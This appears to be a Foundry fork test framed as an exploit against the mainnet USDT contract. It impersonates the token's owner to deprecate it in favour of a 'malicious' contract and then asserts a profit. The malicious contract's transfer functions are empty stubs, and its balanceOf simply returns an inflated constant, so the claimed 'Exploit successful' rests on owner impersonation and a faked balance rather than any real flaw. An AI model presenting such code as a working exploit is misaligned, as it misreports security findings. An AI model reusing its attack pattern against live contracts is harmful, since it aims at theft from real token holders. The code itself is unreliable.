pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Interface for TetherToken
interface TetherToken {
    function owner() external view returns (address);
    function deprecate(address _upgradedAddress) external;
    function transfer(address _to, uint _value) external;
    function balanceOf(address who) external view returns (uint);
    function paused() external view returns (bool);
    function unpause() external;
    function pause() external;
}

// Standard ERC20 interface for balance checks
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

// Malicious upgraded contract
contract MaliciousUpgradedToken {
    address public originalToken;

    constructor(address _originalToken) {
        originalToken = _originalToken;
    }

    // This will be called when TetherToken.transfer() is called after deprecation
    function transferByLegacy(address from, address to, uint value) public {
        // Instead of transferring, we mint new tokens to the recipient
        // In a real exploit, we would manipulate balances
        // For simplicity, we'll just increase the balance
        // Note: This is a simplified version - actual implementation would need
        // to properly interact with the original contract's storage
    }

    function transferFromByLegacy(address sender, address from, address spender, uint value) public {
        // Similar malicious logic
    }

    function approveByLegacy(address from, address spender, uint value) public {
        // Malicious approval logic
    }

    function balanceOf(address who) public view returns (uint) {
        // Return inflated balance for attacker
        return 1_000_000 * 10**6;
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address attacker = address(this);
    // No additional state variables needed

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use vm.prank to impersonate owner
        // We need to find the owner address first
        address owner = TetherToken(TARGET).owner();
        vm.label(owner, "Contract Owner");

        // Deploy malicious upgraded contract
        MaliciousUpgradedToken malicious = new MaliciousUpgradedToken(TARGET);
        vm.label(address(malicious), "Malicious Upgraded Token");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get current balance before exploit
        uint256 initialBalance = IERC20(TARGET).balanceOf(attacker);
        console.log("Initial attacker balance:", initialBalance);

        // Step 2: Find owner address
        address owner = TetherToken(TARGET).owner();
        console.log("Owner address:", owner);

        // Step 3: Impersonate owner and deploy malicious contract
        vm.startPrank(owner);
        MaliciousUpgradedToken malicious = new MaliciousUpgradedToken(TARGET);
        vm.stopPrank();

        // Step 4: Impersonate owner again to call deprecate()
        vm.prank(owner);
        TetherToken(TARGET).deprecate(address(malicious));

        console.log("Contract deprecated, upgraded address set to:", address(malicious));

        // Step 5: Call transfer() which will delegate to malicious contract
        // The malicious contract will mint tokens to attacker
        uint256 mintAmount = 1_000_000 * 10**6; // USDT has 6 decimals

        // We need to ensure the contract is not paused
        vm.prank(owner);
        TetherToken(TARGET).unpause(); // Ensure contract is not paused

        // Call transfer - this will delegate to malicious contract
        TetherToken(TARGET).transfer(attacker, mintAmount);

        // Step 6: Check final balance
        uint256 finalBalance = IERC20(TARGET).balanceOf(attacker);
        console.log("Final attacker balance:", finalBalance);

        // Verify exploit succeeded
        assertGt(finalBalance, initialBalance, "Attacker balance should increase");
        console.log("Exploit successful! Balance increased by:", finalBalance - initialBalance);

        // Additional verification with direct address
        uint256 finalBalanceDirect = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7).balanceOf(address(this));
        assertGt(finalBalanceDirect, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // No helper functions needed
    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

